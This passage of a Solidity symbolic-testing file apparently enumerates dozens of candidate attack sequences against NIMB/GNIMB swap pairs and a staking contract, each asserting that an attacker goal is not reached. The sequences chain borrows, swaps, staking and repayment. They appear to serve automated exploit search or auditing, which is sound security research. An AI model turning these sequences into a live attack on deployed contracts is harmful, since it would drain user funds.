        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3143(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3144(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3145(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3146(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3147(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3148(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3149(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3150(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3151(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3152(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3153(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3154(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3155(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3156(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3157(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3158(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3159(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3160(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3161(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3162(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3163(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3164(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3165(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3166(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3167(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3168(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3169(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3170(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3171(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3172(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3173(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3174(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3175(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3176(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3177(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3178(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3179(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3180(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3181(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3182(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3183(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3184(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3185(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3186(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3187(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3188(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3189(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
